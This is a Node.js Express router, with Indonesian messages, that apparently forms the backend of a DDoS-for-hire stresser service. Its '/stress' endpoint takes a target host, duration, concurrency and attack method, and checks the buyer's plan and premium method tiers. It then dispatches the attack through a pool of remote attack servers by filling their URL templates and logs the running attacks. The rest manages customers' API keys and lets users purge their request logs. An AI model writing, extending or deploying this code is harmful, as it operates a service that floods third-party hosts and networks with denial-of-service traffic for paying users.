const express = require("express");
const crypto = require("crypto");
const { authenticate } = require("../middleware/auth");
const { get, run, withTransaction, db } = require("../db");
const { getActiveUserPlan } = require("../lib/plan");

const router = express.Router();

const selectMethodById = (methodId) =>
  new Promise((resolve, reject) => {
    db.get(
      "SELECT id, name, display_name, layer, tier FROM methods WHERE id = ?",
      [methodId],
      (err, row) => (err ? reject(err) : resolve(row || null)),
    );
  });

const fetchServerMethods = (serverId) =>
  new Promise((resolve, reject) => {
    db.all(
      `SELECT m.id, m.name, m.display_name, m.layer FROM server_methods sm
       JOIN methods m ON m.id = sm.method_id
       WHERE sm.server_id = ?
       ORDER BY m.id ASC`,
      [serverId],
      (err, rows) => (err ? reject(err) : resolve(rows || [])),
    );
  });

const getServerLoad = async (serverId) => {
  const row = await get(
    "SELECT COALESCE(SUM(concurrent), 0) AS load FROM attack_logs WHERE server_id = ? AND status = 'running' AND end_at > ?",
    [serverId, Date.now()],
  );
  return row?.load ? Number(row.load) : 0;
};

const selectServersForMethod = async (methodId, layer, concurrent) => {
  const servers = await new Promise((resolve, reject) => {
    db.all(
      "SELECT id, name, api_url, max_concurrent, max_time, layer, status, success_check_enabled, success_key, success_value FROM servers WHERE layer = ? AND status = 'online'",
      [layer],
      (err, rows) => (err ? reject(err) : resolve(rows || [])),
    );
  });
  const eligible = [];
  for (const srv of servers) {
    const methods = await fetchServerMethods(srv.id);
    if (!methods.find((m) => m.id === methodId)) continue;
    const load = await getServerLoad(srv.id);
    const available = Math.max(0, srv.max_concurrent - load);
    if (available <= 0) continue;
    const take = Math.min(concurrent - eligible.reduce((s, e) => s + e.take, 0), available);
    if (take > 0) eligible.push({ ...srv, available, take });
  }
  return eligible;
};

const apiKeyAuth = async (req, res, next) => {
  const userId = Number(req.params.id);
  const apiKey = req.headers["x-api-key"] || req.query.apiKey || req.body?.apiKey;
  if (!Number.isInteger(userId) || !apiKey) {
    return res.status(401).json({ message: "API key diperlukan" });
  }
  try {
    const row = await get(
      "SELECT user_id, active, logging_enabled, auto_bind, bound_ip, whitelist_ips FROM api_keys WHERE api_key = ? AND user_id = ?",
      [apiKey, userId],
    );
    if (!row) return res.status(401).json({ message: "API key tidak valid" });
    if (!row.active) return res.status(403).json({ message: "API key non-aktif" });
    const clientIp = (req.headers["x-forwarded-for"] || req.connection.remoteAddress || "").split(",")[0].trim();
    if (row.auto_bind) {
      if (!row.bound_ip) {
        await run("UPDATE api_keys SET bound_ip = ? WHERE user_id = ?", [clientIp || null, userId]);
        row.bound_ip = clientIp;
      } else if (clientIp && row.bound_ip !== clientIp) {
        return res.status(403).json({ message: "IP tidak sesuai (auto bind)" });
      }
    }
    if (row.whitelist_ips) {
      const list = row.whitelist_ips.split(",").map((x) => x.trim()).filter(Boolean);
      if (list.length && clientIp && !list.includes(clientIp)) {
        return res.status(403).json({ message: "IP tidak ter-whitelist" });
      }
    }
    req.apiUserId = row.user_id;
    req.apiLoggingEnabled = !!row.logging_enabled;
    return next();
  } catch (err) {
    console.error("API key auth error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
};

router.get("/manager/key", authenticate, async (req, res) => {
  try {
    const row = await get(
      "SELECT api_key, created_at, active, logging_enabled, auto_bind, bound_ip, whitelist_ips FROM api_keys WHERE user_id = ?",
      [req.user.id],
    );
    if (!row) return res.json({ apiKey: null, createdAt: null, active: true, loggingEnabled: true, autoBind: false, whitelist: [] });
    return res.json({
      apiKey: row.api_key,
      createdAt: row.created_at,
      active: !!row.active,
      loggingEnabled: !!row.logging_enabled,
      autoBind: !!row.auto_bind,
      boundIp: row.bound_ip,
      whitelist: row.whitelist_ips ? row.whitelist_ips.split(",").map((x) => x.trim()).filter(Boolean) : [],
    });
  } catch (err) {
    console.error("Get api key error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
});

router.post("/manager/key", authenticate, async (req, res) => {
  try {
    const plan = await getActiveUserPlan(req.user.id);
    if (!plan) {
      return res.status(403).json({ message: "Plan aktif diperlukan untuk membuat API key" });
    }
    if (!plan.apiAccess) {
      return res.status(403).json({ message: "Plan tidak mengizinkan akses API" });
    }
    const apiKey = crypto.randomBytes(3).toString("hex"); // 6 hex chars
    const now = new Date().toISOString();
    await withTransaction(async () => {
      await run("DELETE FROM api_keys WHERE user_id = ?", [req.user.id]);
      await run(
        "INSERT INTO api_keys (user_id, api_key, created_at, active, logging_enabled, auto_bind, bound_ip, whitelist_ips) VALUES (?, ?, ?, 1, 1, 0, NULL, NULL)",
        [req.user.id, apiKey, now],
      );
    });
    return res.json({ apiKey, createdAt: now, active: true, loggingEnabled: true, autoBind: false, whitelist: [] });
  } catch (err) {
    console.error("Generate api key error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
});

router.patch("/manager/key/settings", authenticate, async (req, res) => {
  const { active, loggingEnabled, autoBind, whitelist = [] } = req.body || {};
  const wl = Array.isArray(whitelist) ? whitelist.map((w) => String(w).trim()).filter(Boolean).slice(0, 3) : [];
  try {
    const hasKey = await get("SELECT api_key FROM api_keys WHERE user_id = ?", [req.user.id]);
    if (!hasKey) return res.status(404).json({ message: "Belum ada API key" });
    await run(
      "UPDATE api_keys SET active = COALESCE(?, active), logging_enabled = COALESCE(?, logging_enabled), auto_bind = COALESCE(?, auto_bind), whitelist_ips = ? WHERE user_id = ?",
      [
        active === undefined ? null : active ? 1 : 0,
        loggingEnabled === undefined ? null : loggingEnabled ? 1 : 0,
        autoBind === undefined ? null : autoBind ? 1 : 0,
        wl.length ? wl.join(",") : null,
        req.user.id,
      ],
    );
    return res.json({ message: "Disimpan" });
  } catch (err) {
    console.error("Update api settings error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
});

router.get("/manager/logs", authenticate, async (req, res) => {
  try {
    const rows = await new Promise((resolve, reject) => {
      db.all(
        `SELECT ar.id, ar.host, ar.method_id, ar.time, ar.concurrent, ar.status, ar.created_at, m.display_name
         FROM api_requests ar
         JOIN methods m ON m.id = ar.method_id
         WHERE ar.user_id = ?
         ORDER BY ar.created_at DESC
         LIMIT 50`,
        [req.user.id],
        (err, data) => (err ? reject(err) : resolve(data || [])),
      );
    });
    return res.json({
      logs: rows.map((r) => ({
        id: r.id,
        host: r.host,
        method: r.display_name,
        time: r.time,
        concurrent: r.concurrent,
        status: r.status,
        createdAt: r.created_at,
      })),
    });
  } catch (err) {
    console.error("API logs error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
});

const purgeLogsHandler = async (req, res) => {
  try {
    await run("DELETE FROM api_requests WHERE user_id = ?", [req.user.id]);
    return res.json({ message: "Log dibersihkan" });
  } catch (err) {
    console.error("Purge API logs error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
};

router.delete("/manager/logs", authenticate, purgeLogsHandler);
router.get("/manager/logs/purge", authenticate, purgeLogsHandler);

const handleStress = async (req, res) => {
  const userId = req.apiUserId;
  const src = req.method === "GET" ? req.query : req.body || {};
  const { host, time, concurrent, methodId } = src;
  if (!host || !methodId) return res.status(400).json({ message: "Host dan method wajib diisi" });
  const timeNum = Number(time) || 60;
  const concNum = Number(concurrent) || 1;
  if (timeNum < 1 || timeNum > 3600) return res.status(400).json({ message: "Time tidak valid" });
  if (concNum < 1 || concNum > 1000) return res.status(400).json({ message: "Concurrent tidak valid" });
  try {
    const plan = await getActiveUserPlan(userId);
    if (!plan) return res.status(403).json({ message: "Tidak ada plan aktif" });
    const methodRow = await selectMethodById(Number(methodId));
    if (!methodRow) return res.status(404).json({ message: "Method tidak ditemukan" });
    if (methodRow.tier === "premium" && !plan.premiumAccess) {
      return res.status(403).json({ message: "Plan tidak mendukung method premium" });
    }

    const cappedTime = Math.min(timeNum, plan.maxTime || timeNum);
    const cappedConcurrent = Math.min(concNum, plan.maxConcurrent || concNum);

    const selectedServers = await selectServersForMethod(methodRow.id, methodRow.layer, cappedConcurrent);
    if (!selectedServers.length) {
      return res.status(400).json({ message: "Tidak ada server tersedia" });
    }

    const totalAvailable = selectedServers.reduce((s, srv) => s + srv.available, 0);
    if (totalAvailable < cappedConcurrent) {
      return res.status(400).json({ message: "Server penuh" });
    }

    const now = Date.now();
    const endsAt = now + cappedTime * 1000;
    const tasks = [];
    const failures = [];
    const checkResponse = (srv, status, body) => {
      if (srv.success_check_enabled) {
        try {
          const parsed = JSON.parse(body || "{}");
          const key = srv.success_key || "success";
          const val = parsed?.[key];
          if (srv.success_value === null || srv.success_value === undefined || srv.success_value === "") {
            return Boolean(val);
          }
          return String(val) === String(srv.success_value);
        } catch {
          return false;
        }
      }
      return status >= 200 && status < 300;
    };
    for (const srv of selectedServers) {
      const { take } = srv;
      let url = srv.api_url
        .replace(/\[host\]/g, encodeURIComponent(String(host).trim()))
        .replace(/\[time\]/g, String(cappedTime))
        .replace(/\[method\]/g, encodeURIComponent(methodRow.name));
      for (let i = 0; i < take; i++) {
        const taskId = crypto.randomUUID();
        try {
          const resp = await fetch(url);
          const body = await resp.text().catch(() => "");
          console.log("[API SEND]", { url, status: resp.status, server: srv.name, method: methodRow.name, body: body.slice(0, 200) });
          const ok = checkResponse(srv, resp.status, body);
          if (!ok) {
            failures.push({ server: srv.name, status: resp.status });
            continue;
          }
          await run(
            "INSERT INTO attack_logs (id, host, method_id, server_id, start_at, end_at, time, concurrent, status, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'running', ?)",
            [taskId, String(host).trim(), methodRow.id, srv.id, now, endsAt, cappedTime, 1, new Date().toISOString()],
          );
          tasks.push({ id: taskId, server: srv.name });
        } catch (err) {
          failures.push({ server: srv.name, status: "fetch_error" });
          console.error("[API SEND ERROR]", { url, server: srv.name, method: methodRow.name, error: err.message });
        }
      }
    }

    if (req.apiLoggingEnabled) {
      await run(
        "INSERT INTO api_requests (id, user_id, host, method_id, time, concurrent, status, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
        [crypto.randomUUID(), userId, String(host).trim(), methodRow.id, cappedTime, cappedConcurrent, failures.length ? "partial" : "sent", new Date().toISOString()],
      );
    }

    return res.json({ message: failures.length ? "Sebagian terkirim" : "Dikirim", tasks, failures });
  } catch (err) {
    console.error("API stress error", err);
    return res.status(500).json({ message: "Terjadi kesalahan server" });
  }
};

router.post("/:id/stress", apiKeyAuth, handleStress);
router.get("/:id/stress", apiKeyAuth, handleStress);

module.exports = router;
